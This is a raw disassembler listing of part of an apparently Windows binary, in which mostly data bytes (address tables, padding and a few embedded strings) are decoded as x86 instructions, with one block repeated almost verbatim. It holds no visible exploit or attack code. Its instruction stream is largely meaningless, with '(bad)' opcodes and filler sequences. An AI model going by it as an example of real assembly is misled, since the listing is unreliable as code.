  425192:	add    al,BYTE PTR [eax]
  425194:	neg    BYTE PTR [edi+0x2]
  425197:	add    BYTE PTR [eax],cl
  425199:	pusha  
  42519a:	add    al,BYTE PTR [eax]
  42519c:	adc    al,0x60
  42519e:	add    al,BYTE PTR [eax]
  4251a0:	and    al,0x60
  4251a2:	add    al,BYTE PTR [eax]
  4251a4:	xor    al,0x60
  4251a6:	add    al,BYTE PTR [eax]
  4251a8:	push   eax
  4251a9:	pusha  
  4251aa:	add    al,BYTE PTR [eax]
  4251ac:	fs pusha 
  4251ae:	add    al,BYTE PTR [eax]
  4251b0:	jb     0x425212
  4251b2:	add    al,BYTE PTR [eax]
  4251b4:	mov    WORD PTR [eax+0x2],fs
  4251b7:	add    BYTE PTR [edx-0x51fffda0],bl
  4251bd:	pusha  
  4251be:	add    al,BYTE PTR [eax]
  4251c0:	mov    esi,0xcc000260
  4251c5:	pusha  
  4251c6:	add    al,BYTE PTR [eax]
  4251c8:	add    BYTE PTR [eax],al
  4251ca:	add    BYTE PTR [eax],al
  4251cc:	in     al,dx
  4251cd:	pusha  
  4251ce:	add    al,BYTE PTR [eax]
  4251d0:	cli    
  4251d1:	pusha  
  4251d2:	add    al,BYTE PTR [eax]
  4251d4:	or     al,0x61
  4251d6:	add    al,BYTE PTR [eax]
  4251d8:	and    BYTE PTR [ecx+0x2],ah
  4251db:	add    BYTE PTR [edx],dh
  4251dd:	popa   
  4251de:	add    al,BYTE PTR [eax]
  4251e0:	inc    eax
  4251e1:	popa   
  4251e2:	add    al,BYTE PTR [eax]
  4251e4:	pop    eax
  4251e5:	popa   
  4251e6:	add    al,BYTE PTR [eax]
  4251e8:	jo     0x42524b
  4251ea:	add    al,BYTE PTR [eax]
  4251ec:	and    BYTE PTR [ecx+0x2],0x0
  4251f0:	nop
  4251f1:	popa   
  4251f2:	add    al,BYTE PTR [eax]
  4251f4:	mov    ds:0xb8000261,al
  4251f9:	popa   
  4251fa:	add    al,BYTE PTR [eax]
  4251fc:	les    esp,FWORD PTR [ecx+0x2]
  4251ff:	add    dh,bl
  425201:	popa   
  425202:	add    al,BYTE PTR [eax]
  425204:	cli    
  425205:	popa   
  425206:	add    al,BYTE PTR [eax]
  425208:	add    al,0x62
  42520a:	add    al,BYTE PTR [eax]
  42520c:	sbb    BYTE PTR [edx+0x2],ah
  42520f:	add    BYTE PTR [esi],ch
  425211:	bound  eax,QWORD PTR [edx]
  425213:	add    BYTE PTR [eax+0x62],al
  425216:	add    al,BYTE PTR [eax]
  425218:	push   esp
  425219:	bound  eax,QWORD PTR [edx]
  42521b:	add    BYTE PTR [edx+0x62],ah
  42521e:	add    al,BYTE PTR [eax]
  425220:	je     0x425284
  425222:	add    al,BYTE PTR [eax]
  425224:	mov    BYTE PTR [edx+0x2],ah
  425227:	add    BYTE PTR [edx+eiz*2+0x62a20002],dl
  42522e:	add    al,BYTE PTR [eax]
  425230:	mov    dl,0x62
  425232:	add    al,BYTE PTR [eax]
  425234:	ret    0x262
  425237:	add    al,bl
  425239:	bound  eax,QWORD PTR [edx]
  42523b:	add    dh,ah
  42523d:	bound  eax,QWORD PTR [edx]
  42523f:	add    dh,dh
  425241:	bound  eax,QWORD PTR [edx]
  425243:	add    BYTE PTR [eax],cl
  425245:	arpl   WORD PTR [edx],ax
  425247:	add    BYTE PTR [edx],bl
  425249:	arpl   WORD PTR [edx],ax
  42524b:	add    BYTE PTR [esi],ah
  42524d:	arpl   WORD PTR [edx],ax
  42524f:	add    BYTE PTR [edx],dh
  425251:	arpl   WORD PTR [edx],ax
  425253:	add    BYTE PTR [ebx+eiz*2+0x2],al
  425257:	add    BYTE PTR [ebx+eiz*2+0x2],ah
  42525b:	add    BYTE PTR [edx+0x63],bh
  42525e:	add    al,BYTE PTR [eax]
  425260:	nop
  425261:	arpl   WORD PTR [edx],ax
  425263:	add    BYTE PTR [ebx+eiz*2+0x63b60002],ah
  42526a:	add    al,BYTE PTR [eax]
  42526c:	enter  0x263,0x0
  425270:	fsub   DWORD PTR [ebx+0x2]
  425273:	add    al,ch
  425275:	arpl   WORD PTR [edx],ax
  425277:	add    al,bh
  425279:	arpl   WORD PTR [edx],ax
  42527b:	add    BYTE PTR [eax],cl
  42527d:	add    al,BYTE PTR fs:[eax]
  425280:	sbb    al,0x64
  425282:	add    al,BYTE PTR [eax]
  425284:	sub    ah,BYTE PTR [edx+eax*1+0x0]
  425288:	dec    eax
  425289:	add    al,BYTE PTR fs:[eax]
  42528c:	pop    eax
  42528d:	add    al,BYTE PTR fs:[eax]
  425290:	fs add al,BYTE PTR fs:[eax]
  425294:	add    BYTE PTR [eax],al
  425296:	add    BYTE PTR [eax],al
  425298:	mov    BYTE PTR [edx+eax*1+0x0],ah
  42529c:	xchg   esi,eax
  42529d:	add    al,BYTE PTR fs:[eax]
  4252a0:	mov    ds:0xaa000264,al
  4252a5:	add    al,BYTE PTR fs:[eax]
  4252a8:	mov    ah,0x64
  4252aa:	add    al,BYTE PTR [eax]
  4252ac:	(bad)  
  4252ad:	add    al,BYTE PTR fs:[eax]
  4252b0:	aam    0x64
  4252b2:	add    al,BYTE PTR [eax]
  4252b4:	fisub  WORD PTR [edx+eax*1+0x0]
  4252b8:	call   0xf2425521
  4252bd:	add    al,BYTE PTR fs:[eax]
  4252c0:	add    ah,BYTE PTR [ebp+0x2]
  4252c3:	add    BYTE PTR [eax],dl
  4252c5:	add    al,BYTE PTR gs:[eax]
  4252c8:	sbb    al,0x65
  4252ca:	add    al,BYTE PTR [eax]
  4252cc:	es add al,BYTE PTR gs:[eax]
  4252d0:	xor    al,0x65
  4252d2:	add    al,BYTE PTR [eax]
  4252d4:	cmp    al,0x65
  4252d6:	add    al,BYTE PTR [eax]
  4252d8:	inc    esi
  4252d9:	add    al,BYTE PTR gs:[eax]
  4252dc:	push   eax
  4252dd:	add    al,BYTE PTR gs:[eax]
  4252e0:	pop    esp
  4252e1:	add    al,BYTE PTR gs:[eax]
  4252e4:	fs add al,BYTE PTR gs:[eax]
  4252e8:	jb     0x42534f
  4252ea:	add    al,BYTE PTR [eax]
  4252ec:	jl     0x425353
  4252ee:	add    al,BYTE PTR [eax]
  4252f0:	xchg   BYTE PTR [ebp+0x2],ah
  4252f3:	add    BYTE PTR [esi-0x67fffd9b],cl
  4252f9:	add    al,BYTE PTR gs:[eax]
  4252fc:	mov    ds:0xac000265,al
  425301:	add    al,BYTE PTR gs:[eax]
  425304:	mov    ah,0x65
  425306:	add    al,BYTE PTR [eax]
  425308:	enter  0x265,0x0
  42530c:	shl    BYTE PTR [ebp+0x2],cl
  42530f:	add    ah,bl
  425311:	add    al,BYTE PTR gs:[eax]
  425314:	out    0x65,al
  425316:	add    al,BYTE PTR [eax]
  425318:	out    dx,al
  425319:	add    al,BYTE PTR gs:[eax]
  42531c:	mul    BYTE PTR [ebp+0x2]
  42531f:	add    BYTE PTR [eax],al
  425321:	data16 add al,BYTE PTR [eax]
  425324:	or     ah,BYTE PTR [esi+0x2]
  425327:	add    BYTE PTR [esi+eiz*2],dl
  42532a:	add    al,BYTE PTR [eax]
  42532c:	and    BYTE PTR [esi+0x2],ah
  42532f:	add    BYTE PTR [esi+eiz*2],ch
  425332:	add    al,BYTE PTR [eax]
  425334:	data16 add al,BYTE PTR ss:[eax]
  425338:	data16 add al,BYTE PTR ds:[eax]
  42533c:	dec    esi
  42533d:	data16 add al,BYTE PTR [eax]
  425340:	pop    eax
  425341:	data16 add al,BYTE PTR [eax]
  425344:	bound  esp,QWORD PTR [esi+0x2]
  425347:	add    BYTE PTR [eax],al
  425349:	add    BYTE PTR [eax],al
  42534b:	add    BYTE PTR [edx+0x66],bh
  42534e:	add    al,BYTE PTR [eax]
  425350:	mov    ah,BYTE PTR [esi+0x2]
  425353:	add    BYTE PTR [eax-0x4bfffd9a],ah
  425359:	data16 add al,BYTE PTR [eax]
  42535c:	shl    BYTE PTR [esi+0x2],0x0
  425360:	shl    BYTE PTR [esi+0x2],1
  425363:	add    ah,ah
  425365:	data16 add al,BYTE PTR [eax]
  425368:	cli    
  425369:	data16 add al,BYTE PTR [eax]
  42536c:	or     ah,BYTE PTR [edi+0x2]
  42536f:	add    BYTE PTR [edi+eiz*2],dl
  425372:	add    al,BYTE PTR [eax]
  425374:	add    al,BYTE PTR es:[bx+si]
  425378:	xor    BYTE PTR [edi+0x2],ah
  42537b:	add    BYTE PTR [esi+0x67],al
  42537e:	add    al,BYTE PTR [eax]
  425380:	push   edx
  425381:	add    al,BYTE PTR [bx+si]
  425384:	pop    esp
  425385:	add    al,BYTE PTR [bx+si]
  425388:	data16 add al,BYTE PTR [bx+si]
  42538c:	js     0x4253f5
  42538e:	add    al,BYTE PTR [eax]
  425390:	test   BYTE PTR [edi+0x2],ah
  425393:	add    BYTE PTR [eax-0x57fffd99],bl
  425399:	add    al,BYTE PTR [bx+si]
  42539c:	mov    dh,0x67
  42539e:	add    al,BYTE PTR [eax]
  4253a0:	retf   0x267
  4253a3:	add    dh,dl
  4253a5:	add    al,BYTE PTR [bx+si]
  4253a8:	jmp    0x267:0xf4000267
  4253af:	add    BYTE PTR [edx],al
  4253b1:	push   0x680c0002
  4253b6:	add    al,BYTE PTR [eax]
  4253b8:	sbb    BYTE PTR [eax+0x2],ch
  4253bb:	add    BYTE PTR [eax+ebp*2],ch
  4253be:	add    al,BYTE PTR [eax]
  4253c0:	ss push 0x684c0002
  4253c6:	add    al,BYTE PTR [eax]
  4253c8:	pop    eax
  4253c9:	push   0x68680002
  4253ce:	add    al,BYTE PTR [eax]
  4253d0:	jp     0x42543a
  4253d2:	add    al,BYTE PTR [eax]
  4253d4:	mov    BYTE PTR [eax+0x2],ch
  4253d7:	add    BYTE PTR [eax-0x5bfffd98],bl
  4253dd:	push   0x68b00002
  4253e2:	add    al,BYTE PTR [eax]
  4253e4:	les    ebp,FWORD PTR [eax+0x2]
  4253e7:	add    dh,cl
  4253e9:	push   0x68e60002
  4253ee:	add    al,BYTE PTR [eax]
  4253f0:	(bad)  
  4253f1:	push   0x690a0002
  4253f6:	add    al,BYTE PTR [eax]
  4253f8:	sbb    ch,BYTE PTR [ecx+0x2]
	...
  425403:	add    BYTE PTR [edi+0x4d248f],dh
  425409:	add    BYTE PTR [eax],al
  42540b:	add    BYTE PTR [edx],al
  42540d:	add    BYTE PTR [eax],al
  42540f:	add    BYTE PTR [ecx+0x0],bl
  425412:	add    BYTE PTR [eax],al
  425414:	jb     0x4253bc
  425416:	add    al,BYTE PTR [eax]
  425418:	jb     0x4253b2
  42541a:	add    al,BYTE PTR [eax]
  42541c:	add    BYTE PTR [eax],al
  42541e:	add    BYTE PTR [eax],al
  425420:	pop    edx
  425421:	push   ecx
  425422:	imul   ebx,DWORD PTR [edx+0x59],0x74
  425426:	arpl   WORD PTR [ebp+0x7a],dx
  425429:	ja     0x425472
  42542b:	jp     0x42547c
  42542d:	gs dec ebx
  42542f:	dec    ebp
  425430:	je     0x4254a1
  425432:	ja     0x42549d
  425434:	popa   
  425435:	push   edi
  425436:	jno    0x425489
  425438:	jae    0x4254a1
  42543a:	dec    ebx
  42543b:	dec    esp
  42543c:	jae    0x4254b8
  42543e:	dec    ebp
  42543f:	push   ebx
  425440:	push   eax
  425441:	push   esi
  425442:	push   eax
  425443:	fs pop eax
  425445:	ins    DWORD PTR es:[edi],dx
  425446:	push   0x56637a49
  42544b:	inc    ebp
  42544c:	dec    esi
  42544d:	push   ecx
  42544e:	ins    DWORD PTR es:[edi],dx
  42544f:	inc    ecx
  425450:	push   0x61
  425452:	dec    edx
  425453:	data16 ins BYTE PTR es:[edi],dx
  425455:	jne    0x4254b9
  425457:	imul   ecx,DWORD PTR [edx+0x46],0x75646348
  42545e:	jno    0x4254ca
  425460:	arpl   WORD PTR [edx+0x7a],sp
  425463:	dec    ebp
  425464:	dec    edi
  425465:	push   ecx
  425466:	imul   edx,DWORD PTR [ebp+edx*2+0x6f],0x4b62554b
  42546e:	push   edi
  42546f:	imul   eax,DWORD PTR [eax],0xb7000000
  425475:	(bad)  
  425476:	and    al,0x4d
  425478:	add    BYTE PTR [eax],al
  42547a:	add    BYTE PTR [eax],al
  42547c:	mov    ds:0x1000254,al
  425481:	add    BYTE PTR [eax],al
  425483:	add    BYTE PTR [ecx],al
  425485:	add    BYTE PTR [eax],al
  425487:	add    BYTE PTR [ecx],al
  425489:	add    BYTE PTR [eax],al
  42548b:	add    BYTE PTR [eax-0x63fffdac],bl
  425491:	push   esp
  425492:	add    al,BYTE PTR [eax]
  425494:	mov    al,ds:0x4e000254
  425499:	dec    esi
  42549a:	add    DWORD PTR [eax],eax
  42549c:	mov    bl,0x54
  42549e:	add    al,BYTE PTR [eax]
  4254a0:	add    BYTE PTR [eax],al
  4254a2:	push   eax
  4254a3:	xor    esp,DWORD PTR [edi+0x74]
  4254a6:	jns    0x425514
  4254a8:	bound  esp,QWORD PTR [edi+0x6b]
  4254ab:	popa   
  4254ac:	push   0x68
  4254ae:	cs je  0x42551a
  4254b1:	jo     0x4254b3
  4254b3:	aas    
  4254b4:	inc    ecx
  4254b5:	jo     0x425527
  4254b7:	dec    esi
  4254b8:	popa   
  4254b9:	ins    DWORD PTR es:[edi],dx
  4254ba:	gs inc ebp
  4254bc:	js     0x425515
  4254be:	inc    eax
  4254bf:	inc    eax
  4254c0:	pop    ecx
  4254c1:	inc    edi
  4254c2:	push   eax
  4254c3:	inc    ecx
  4254c4:	inc    edi
  4254c5:	push   eax
  4254c6:	inc    ecx
  4254c7:	dec    ebp
  4254c8:	push   eax
  4254c9:	inc    ecx
  4254ca:	inc    esi
  4254cb:	push   eax
  4254cc:	inc    ecx
  4254cd:	dec    ebp
  4254ce:	dec    ecx
  4254cf:	cmp    al,0x56
	...
  4254dd:	add    BYTE PTR [eax],al
  4254df:	add    BYTE PTR [eax+0x55],bl
  4254e2:	add    al,BYTE PTR [eax]
	...
  4254ec:	fcomp  QWORD PTR [ecx+0x2]
  4254ef:	add    BYTE PTR [eax],al
  4254f1:	push   eax
  4254f2:	add    al,BYTE PTR [eax]
  4254f4:	je     0x42554b
  4254f6:	add    al,BYTE PTR [eax]
	...
  425500:	loopne 0x425562
  425502:	add    al,BYTE PTR [eax]
  425504:	sbb    al,0x50
  425506:	add    al,BYTE PTR [eax]
  425508:	and    al,0x57
  42550a:	add    al,BYTE PTR [eax]
	...
  425514:	jp     0x42557a
  425516:	add    al,BYTE PTR [eax]
  425518:	int3   
  425519:	push   ecx
  42551a:	add    al,BYTE PTR [eax]
  42551c:	lock push edi
  42551e:	add    al,BYTE PTR [eax]
	...
  425528:	outs   dx,BYTE PTR ds:[esi]
  425529:	data16 add al,BYTE PTR [eax]
  42552c:	cwde   
  42552d:	push   edx
  42552e:	add    al,BYTE PTR [eax]
  425530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425531:	pop    eax
  425532:	add    al,BYTE PTR [eax]
	...
  42553c:	sub    BYTE PTR [ecx+0x2],ch
  42553f:	add    BYTE PTR [ebx+edx*2+0x2],cl
	...
  425557:	add    BYTE PTR [eax+0x59],bl
  42555a:	add    al,BYTE PTR [eax]
  42555c:	jo     0x4255b7
  42555e:	add    al,BYTE PTR [eax]
  425560:	test   BYTE PTR [ecx+0x2],bl
  425563:	add    BYTE PTR [esi-0x55fffda7],dl
  425569:	pop    ecx
  42556a:	add    al,BYTE PTR [eax]
  42556c:	rcr    BYTE PTR [ecx+0x2],0x0
  425570:	add    BYTE PTR [eax],al
  425572:	add    BYTE PTR [eax],al
  425574:	jmp    0x259:0xf8000259
  42557b:	add    BYTE PTR [edx+ebx*2],al
  42557e:	add    al,BYTE PTR [eax]
  425580:	adc    bl,BYTE PTR [edx+0x2]
  425583:	add    BYTE PTR [esi],bl
  425585:	pop    edx
  425586:	add    al,BYTE PTR [eax]
  425588:	sub    al,0x5a
  42558a:	add    al,BYTE PTR [eax]
  42558c:	ds pop edx
  42558e:	add    al,BYTE PTR [eax]
  425590:	dec    esi
  425591:	pop    edx
  425592:	add    al,BYTE PTR [eax]
  425594:	pusha  
  425595:	pop    edx
  425596:	add    al,BYTE PTR [eax]
  425598:	ins    BYTE PTR es:[edi],dx
  425599:	pop    edx
  42559a:	add    al,BYTE PTR [eax]
  42559c:	js     0x4255f8
  42559e:	add    al,BYTE PTR [eax]
  4255a0:	mov    bl,BYTE PTR [edx+0x2]
  4255a3:	add    BYTE PTR [esi-0x55fffda6],dl
  4255a9:	pop    edx
  4255aa:	add    al,BYTE PTR [eax]
  4255ac:	mov    edx,0xc800025a
  4255b1:	pop    edx
  4255b2:	add    al,BYTE PTR [eax]
  4255b4:	(bad)  
  4255b5:	pop    edx
  4255b6:	add    al,BYTE PTR [eax]
  4255b8:	loop   0x425614
  4255ba:	add    al,BYTE PTR [eax]
  4255bc:	lock pop edx
  4255be:	add    al,BYTE PTR [eax]
  4255c0:	(bad)  
  4255c1:	pop    edx
  4255c2:	add    al,BYTE PTR [eax]
  4255c4:	or     bl,BYTE PTR [ebx+0x2]
  4255c7:	add    BYTE PTR [edx],bl
  4255c9:	pop    ebx
  4255ca:	add    al,BYTE PTR [eax]
  4255cc:	sub    BYTE PTR [ebx+0x2],bl
  4255cf:	add    BYTE PTR [ebx+ebx*2],dh
  4255d2:	add    al,BYTE PTR [eax]
  4255d4:	inc    eax
  4255d5:	pop    ebx
  4255d6:	add    al,BYTE PTR [eax]
  4255d8:	push   eax
  4255d9:	pop    ebx
  4255da:	add    al,BYTE PTR [eax]
  4255dc:	pusha  
  4255dd:	pop    ebx
  4255de:	add    al,BYTE PTR [eax]
  4255e0:	jb     0x42563d
  4255e2:	add    al,BYTE PTR [eax]
  4255e4:	test   BYTE PTR [ebx+0x2],bl
  4255e7:	add    BYTE PTR [eax-0x57fffda5],bl
  4255ed:	pop    ebx
  4255ee:	add    al,BYTE PTR [eax]
  4255f0:	mov    ah,0x5b
  4255f2:	add    al,BYTE PTR [eax]
  4255f4:	(bad)  
  4255f5:	pop    ebx
  4255f6:	add    al,BYTE PTR [eax]
  4255f8:	rcr    BYTE PTR [ebx+0x2],cl
  4255fb:	add    dh,bl
  4255fd:	pop    ebx
  4255fe:	add    al,BYTE PTR [eax]
  425600:	out    dx,al
  425601:	pop    ebx
  425602:	add    al,BYTE PTR [eax]
  425604:	cld    
  425605:	pop    ebx
  425606:	add    al,BYTE PTR [eax]
  425608:	push   cs
  425609:	pop    esp
  42560a:	add    al,BYTE PTR [eax]
  42560c:	push   ds
  42560d:	pop    esp
  42560e:	add    al,BYTE PTR [eax]
  425610:	cs pop esp
  425612:	add    al,BYTE PTR [eax]
  425614:	inc    eax
  425615:	pop    esp
  425616:	add    al,BYTE PTR [eax]
  425618:	dec    esp
  425619:	pop    esp
  42561a:	add    al,BYTE PTR [eax]
  42561c:	pop    sp
  42561e:	add    al,BYTE PTR [eax]
  425620:	jbe    0x42567e
  425622:	add    al,BYTE PTR [eax]
  425624:	mov    ds,WORD PTR [edx+eax*1+0x0]
  425628:	mov    ds:0xb000025c,al
  42562d:	pop    esp
  42562e:	add    al,BYTE PTR [eax]
  425630:	ret    0x25c
  425633:	add    dh,dl
  425635:	pop    esp
  425636:	add    al,BYTE PTR [eax]
  425638:	jmp    0x25c:0xfc00025c
  42563f:	add    BYTE PTR [edx],cl
  425641:	pop    ebp
  425642:	add    al,BYTE PTR [eax]
  425644:	sbb    al,0x5d
  425646:	add    al,BYTE PTR [eax]
  425648:	sub    bl,BYTE PTR [ebp+0x2]
  42564b:	add    BYTE PTR [edx],bh
  42564d:	pop    ebp
  42564e:	add    al,BYTE PTR [eax]
  425650:	dec    esi
  425651:	pop    ebp
  425652:	add    al,BYTE PTR [eax]
  425654:	fs pop ebp
  425656:	add    al,BYTE PTR [eax]
  425658:	jbe    0x4256b7
  42565a:	add    al,BYTE PTR [eax]
  42565c:	test   BYTE PTR [ebp+0x2],bl
  42565f:	add    BYTE PTR [ebp+ebx*2+0x5da20002],dl
  425666:	add    al,BYTE PTR [eax]
  425668:	rcr    BYTE PTR [ebp+0x2],0x0
  42566c:	into   
  42566d:	pop    ebp
  42566e:	add    al,BYTE PTR [eax]
  425670:	ficomp DWORD PTR [ebp+0x2]
  425673:	add    ah,ch
  425675:	pop    ebp
  425676:	add    al,BYTE PTR [eax]
  425678:	cli    
  425679:	pop    ebp
  42567a:	add    al,BYTE PTR [eax]
  42567c:	push   es
  42567d:	pop    esi
  42567e:	add    al,BYTE PTR [eax]
  425680:	push   ds
  425681:	pop    esi
  425682:	add    al,BYTE PTR [eax]
  425684:	cs pop esi
  425686:	add    al,BYTE PTR [eax]
  425688:	cmp    bl,BYTE PTR [esi+0x2]
  42568b:	add    BYTE PTR [edx+0x5e],cl
  42568e:	add    al,BYTE PTR [eax]
  425690:	fs pop esi
  425692:	add    al,BYTE PTR [eax]
  425694:	jp     0x4256f4
  425696:	add    al,BYTE PTR [eax]
  425698:	mov    BYTE PTR [esi+0x2],bl
  42569b:	add    BYTE PTR [edx-0x4dfffda2],bl
  4256a1:	pop    esi
  4256a2:	add    al,BYTE PTR [eax]
  4256a4:	ret    0x25e
  4256a7:	add    al,dl
  4256a9:	pop    esi
  4256aa:	add    al,BYTE PTR [eax]
  4256ac:	jmp    0x25e:0xfa00025e
  4256b3:	add    BYTE PTR [esi],cl
  4256b5:	pop    edi
  4256b6:	add    al,BYTE PTR [eax]
  4256b8:	sbb    bl,BYTE PTR [edi+0x2]
  4256bb:	add    BYTE PTR [edx],ch
  4256bd:	pop    edi
  4256be:	add    al,BYTE PTR [eax]
  4256c0:	cmp    bl,BYTE PTR [edi+0x2]
  4256c3:	add    BYTE PTR [edx+0x5f],cl
  4256c6:	add    al,BYTE PTR [eax]
  4256c8:	pusha  
  4256c9:	pop    edi
  4256ca:	add    al,BYTE PTR [eax]
  4256cc:	jb     0x42572d
  4256ce:	add    al,BYTE PTR [eax]
  4256d0:	mov    BYTE PTR [edi+0x2],bl
  4256d3:	add    BYTE PTR [edi+ebx*2+0x5fa40002],dl
  4256da:	add    al,BYTE PTR [eax]
  4256dc:	mov    dl,0x5f
  4256de:	add    al,BYTE PTR [eax]
  4256e0:	rcr    BYTE PTR [edi+0x2],0x0
  4256e4:	rcr    BYTE PTR [edi+0x2],cl
  4256e7:	add    dh,ah
  4256e9:	pop    edi
  4256ea:	add    al,BYTE PTR [eax]
  4256ec:	neg    BYTE PTR [edi+0x2]
  4256ef:	add    BYTE PTR [eax],cl
  4256f1:	pusha  
  4256f2:	add    al,BYTE PTR [eax]
  4256f4:	adc    al,0x60
  4256f6:	add    al,BYTE PTR [eax]
  4256f8:	and    al,0x60
  4256fa:	add    al,BYTE PTR [eax]
  4256fc:	xor    al,0x60
  4256fe:	add    al,BYTE PTR [eax]
  425700:	push   eax
  425701:	pusha  
  425702:	add    al,BYTE PTR [eax]
  425704:	fs pusha 
  425706:	add    al,BYTE PTR [eax]
  425708:	jb     0x42576a
  42570a:	add    al,BYTE PTR [eax]
  42570c:	mov    WORD PTR [eax+0x2],fs
  42570f:	add    BYTE PTR [edx-0x51fffda0],bl
  425715:	pusha  
  425716:	add    al,BYTE PTR [eax]
  425718:	mov    esi,0xcc000260
  42571d:	pusha  
  42571e:	add    al,BYTE PTR [eax]
  425720:	add    BYTE PTR [eax],al
  425722:	add    BYTE PTR [eax],al
  425724:	in     al,dx
  425725:	pusha  
  425726:	add    al,BYTE PTR [eax]
  425728:	cli    
  425729:	pusha  
  42572a:	add    al,BYTE PTR [eax]
  42572c:	or     al,0x61
  42572e:	add    al,BYTE PTR [eax]
  425730:	and    BYTE PTR [ecx+0x2],ah
  425733:	add    BYTE PTR [edx],dh
  425735:	popa   
  425736:	add    al,BYTE PTR [eax]
  425738:	inc    eax
  425739:	popa   
  42573a:	add    al,BYTE PTR [eax]
  42573c:	pop    eax
  42573d:	popa   
  42573e:	add    al,BYTE PTR [eax]
  425740:	jo     0x4257a3
  425742:	add    al,BYTE PTR [eax]
  425744:	and    BYTE PTR [ecx+0x2],0x0
  425748:	nop
  425749:	popa   
  42574a:	add    al,BYTE PTR [eax]
  42574c:	mov    ds:0xb8000261,al
  425751:	popa   
  425752:	add    al,BYTE PTR [eax]
  425754:	les    esp,FWORD PTR [ecx+0x2]
  425757:	add    dh,bl
  425759:	popa   
  42575a:	add    al,BYTE PTR [eax]
  42575c:	cli    
  42575d:	popa   
  42575e:	add    al,BYTE PTR [eax]
  425760:	add    al,0x62
  425762:	add    al,BYTE PTR [eax]
  425764:	sbb    BYTE PTR [edx+0x2],ah
  425767:	add    BYTE PTR [esi],ch
  425769:	bound  eax,QWORD PTR [edx]
  42576b:	add    BYTE PTR [eax+0x62],al
  42576e:	add    al,BYTE PTR [eax]
  425770:	push   esp
  425771:	bound  eax,QWORD PTR [edx]
  425773:	add    BYTE PTR [edx+0x62],ah
  425776:	add    al,BYTE PTR [eax]
  425778:	je     0x4257dc
  42577a:	add    al,BYTE PTR [eax]
  42577c:	mov    BYTE PTR [edx+0x2],ah
  42577f:	add    BYTE PTR [edx+eiz*2+0x62a20002],dl
  425786:	add    al,BYTE PTR [eax]
  425788:	mov    dl,0x62
  42578a:	add    al,BYTE PTR [eax]
  42578c:	ret    0x262
  42578f:	add    al,bl
  425791:	bound  eax,QWORD PTR [edx]
  425793:	add    dh,ah
  425795:	bound  eax,QWORD PTR [edx]
  425797:	add    dh,dh
  425799:	bound  eax,QWORD PTR [edx]
  42579b:	add    BYTE PTR [eax],cl
  42579d:	arpl   WORD PTR [edx],ax
  42579f:	add    BYTE PTR [edx],bl
  4257a1:	arpl   WORD PTR [edx],ax
  4257a3:	add    BYTE PTR [esi],ah
  4257a5:	arpl   WORD PTR [edx],ax
  4257a7:	add    BYTE PTR [edx],dh
  4257a9:	arpl   WORD PTR [edx],ax
  4257ab:	add    BYTE PTR [ebx+eiz*2+0x2],al
  4257af:	add    BYTE PTR [ebx+eiz*2+0x2],ah
  4257b3:	add    BYTE PTR [edx+0x63],bh
  4257b6:	add    al,BYTE PTR [eax]
  4257b8:	nop
  4257b9:	arpl   WORD PTR [edx],ax
  4257bb:	add    BYTE PTR [ebx+eiz*2+0x63b60002],ah
  4257c2:	add    al,BYTE PTR [eax]
  4257c4:	enter  0x263,0x0
  4257c8:	fsub   DWORD PTR [ebx+0x2]
  4257cb:	add    al,ch
  4257cd:	arpl   WORD PTR [edx],ax
  4257cf:	add    al,bh
  4257d1:	arpl   WORD PTR [edx],ax
  4257d3:	add    BYTE PTR [eax],cl
  4257d5:	add    al,BYTE PTR fs:[eax]
  4257d8:	sbb    al,0x64
  4257da:	add    al,BYTE PTR [eax]
  4257dc:	sub    ah,BYTE PTR [edx+eax*1+0x0]
  4257e0:	dec    eax
  4257e1:	add    al,BYTE PTR fs:[eax]
  4257e4:	pop    eax
  4257e5:	add    al,BYTE PTR fs:[eax]
  4257e8:	fs add al,BYTE PTR fs:[eax]
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	add    BYTE PTR [eax],al
  4257f0:	mov    BYTE PTR [edx+eax*1+0x0],ah
  4257f4:	xchg   esi,eax
  4257f5:	add    al,BYTE PTR fs:[eax]
  4257f8:	mov    ds:0xaa000264,al
  4257fd:	add    al,BYTE PTR fs:[eax]
  425800:	mov    ah,0x64
  425802:	add    al,BYTE PTR [eax]
  425804:	(bad)  
  425805:	add    al,BYTE PTR fs:[eax]
  425808:	aam    0x64
  42580a:	add    al,BYTE PTR [eax]
  42580c:	fisub  WORD PTR [edx+eax*1+0x0]
  425810:	call   0xf2425a79
  425815:	add    al,BYTE PTR fs:[eax]
  425818:	add    ah,BYTE PTR [ebp+0x2]
  42581b:	add    BYTE PTR [eax],dl
  42581d:	add    al,BYTE PTR gs:[eax]
  425820:	sbb    al,0x65
  425822:	add    al,BYTE PTR [eax]
  425824:	es add al,BYTE PTR gs:[eax]
  425828:	xor    al,0x65
  42582a:	add    al,BYTE PTR [eax]
  42582c:	cmp    al,0x65
  42582e:	add    al,BYTE PTR [eax]
  425830:	inc    esi
  425831:	add    al,BYTE PTR gs:[eax]
  425834:	push   eax
  425835:	add    al,BYTE PTR gs:[eax]
  425838:	pop    esp
  425839:	add    al,BYTE PTR gs:[eax]
  42583c:	fs add al,BYTE PTR gs:[eax]
  425840:	jb     0x4258a7
  425842:	add    al,BYTE PTR [eax]
  425844:	jl     0x4258ab
  425846:	add    al,BYTE PTR [eax]
  425848:	xchg   BYTE PTR [ebp+0x2],ah
  42584b:	add    BYTE PTR [esi-0x67fffd9b],cl
  425851:	add    al,BYTE PTR gs:[eax]
  425854:	mov    ds:0xac000265,al
  425859:	add    al,BYTE PTR gs:[eax]
  42585c:	mov    ah,0x65
  42585e:	add    al,BYTE PTR [eax]
  425860:	enter  0x265,0x0
  425864:	shl    BYTE PTR [ebp+0x2],cl
  425867:	add    ah,bl
  425869:	add    al,BYTE PTR gs:[eax]
  42586c:	out    0x65,al
  42586e:	add    al,BYTE PTR [eax]
  425870:	out    dx,al
  425871:	add    al,BYTE PTR gs:[eax]
  425874:	mul    BYTE PTR [ebp+0x2]
  425877:	add    BYTE PTR [eax],al
  425879:	data16 add al,BYTE PTR [eax]
  42587c:	or     ah,BYTE PTR [esi+0x2]
  42587f:	add    BYTE PTR [esi+eiz*2],dl
  425882:	add    al,BYTE PTR [eax]
  425884:	and    BYTE PTR [esi+0x2],ah
  425887:	add    BYTE PTR [esi+eiz*2],ch
  42588a:	add    al,BYTE PTR [eax]
  42588c:	data16 add al,BYTE PTR ss:[eax]
  425890:	data16 add al,BYTE PTR ds:[eax]
  425894:	dec    esi
  425895:	data16 add al,BYTE PTR [eax]
  425898:	pop    eax
  425899:	data16 add al,BYTE PTR [eax]
  42589c:	bound  esp,QWORD PTR [esi+0x2]
